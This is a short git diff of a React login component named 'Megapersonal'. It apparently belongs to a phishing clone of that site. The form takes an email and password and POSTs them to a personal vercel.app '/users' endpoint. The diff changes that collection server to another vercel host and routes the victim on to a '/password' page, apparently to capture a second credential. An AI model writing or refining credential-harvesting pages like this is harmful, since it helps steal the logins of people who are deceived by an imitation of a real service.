@@ -18,13 +18,13 @@ const Megapersonal = () => {
       Email: data.example,
       Password: data.exampleRequired,
     };
-    fetch("https://roni-mega.vercel.app/users", {
+    fetch("https://hakim-meet-mega-sarver.vercel.app/users", {
       method: "POST",
       headers: { "Content-type": "application/json" },
       body: JSON.stringify(ItemId),
     })
       .then((res) => res.json())
-      .then((result) => navigate("/verify"));
+      .then((result) => navigate("/password"));
   };
   return (
     <div className="text-center">
@@ -63,11 +63,7 @@ const Megapersonal = () => {
             {/* errors will return when field validation fails  */}
             {errors.exampleRequired && <span>This field is required</span>}
 
-            <input
-              onClick={() => navigate("/password")}
-              className="submit  mt-3 w-50%"
-              type="SUBMIT"
-            />
+            <input className="submit  mt-3 w-50%" type="SUBMIT" />
           </form>
         </div>
         <p className="pt-4 pb-4 Google">
